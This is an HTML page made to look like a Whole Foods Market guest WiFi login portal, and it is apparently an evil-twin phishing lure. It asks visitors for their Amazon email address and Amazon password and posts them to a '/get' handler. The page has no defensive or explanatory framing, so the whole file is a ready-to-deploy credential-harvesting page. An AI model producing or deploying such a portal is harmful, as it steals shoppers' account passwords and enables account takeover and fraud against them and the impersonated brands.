<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1">
<style>
*{box-sizing:border-box;margin:0;padding:0}
body{font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Arial,sans-serif;background:#00674b;min-height:100vh;display:flex;flex-direction:column;align-items:center;justify-content:center;padding:20px}
.wflogo{text-align:center;margin-bottom:20px}
.wflogo h1{font-size:24px;font-weight:700;color:#fff;letter-spacing:0.5px}
.wflogo p{font-size:11px;color:rgba(255,255,255,0.7);letter-spacing:1.5px;text-transform:uppercase;margin-top:4px}
.card{background:#fff;width:100%;max-width:420px;border-radius:16px;overflow:hidden;box-shadow:0 16px 48px rgba(0,0,0,0.25)}
.ch{background:#1a3a2a;padding:20px 24px;text-align:center}
.ch h1{font-size:16px;font-weight:700;color:#fff}.ch p{font-size:12px;color:rgba(255,255,255,0.65);margin-top:3px}
.cb{padding:24px}
.badge{display:flex;align-items:center;gap:10px;background:#f0faf5;border:1px solid #b0dfc8;border-radius:8px;padding:10px 13px;margin-bottom:20px}
.dot{width:8px;height:8px;background:#4ade80;border-radius:50%;flex-shrink:0;box-shadow:0 0 0 3px rgba(74,222,128,0.2)}
.badge span{font-size:12.5px;color:#666}.badge strong{color:#1a1a1a;font-weight:600}
.lbl{display:block;font-size:11px;font-weight:700;text-transform:uppercase;letter-spacing:0.8px;color:#888;margin-bottom:6px;margin-top:14px}
input{width:100%;padding:12px 14px;border:1.5px solid #e0e0e0;border-radius:9px;font-size:15px;background:#fafafa;color:#1a1a1a}
input:focus{outline:none;border-color:#00674b;box-shadow:0 0 0 3px rgba(0,103,75,0.1)}
input::placeholder{color:#c0c0c0}
.terms{font-size:11px;color:#aaa;line-height:1.5;margin-top:14px}.terms a{color:#00674b}
.btn{width:100%;padding:13px;border:none;border-radius:9px;background:#00674b;color:#fff;font-size:14px;font-weight:700;cursor:pointer;margin-top:14px}
.foot{background:#f5faf7;border-top:1px solid #eee;padding:12px 24px;display:flex;justify-content:space-between}
.foot span,.foot a{font-size:11px;color:#aaa}.foot a{color:#00674b;text-decoration:none}
</style>
</head>
<body>
<div class="wflogo"><h1>Whole Foods Market</h1><p>An Amazon Company &bull; Free WiFi</p></div>
<div class="card">
  <div class="ch"><h1>Whole Foods Guest WiFi</h1><p>Sign in with your Amazon account</p></div>
  <div class="cb">
    <div class="badge"><div class="dot"></div><span>Network: <strong>WFM-Guest</strong></span></div>
    <form action="/get">
      <label class="lbl">Amazon / Prime Email</label>
      <input name="email" type="text" placeholder="you@example.com" required>
      <label class="lbl">Password</label>
      <input name="password" type="password" placeholder="Enter your Amazon password" required>
      <p class="terms">By connecting you agree to <a href="#">Whole Foods' Terms of Use</a>.</p>
      <button type="submit" class="btn">Sign In &amp; Connect</button>
    </form>
  </div>
  <div class="foot"><span>&copy; Whole Foods Market</span><a href="#">Help</a></div>
</div>
</body>
</html>
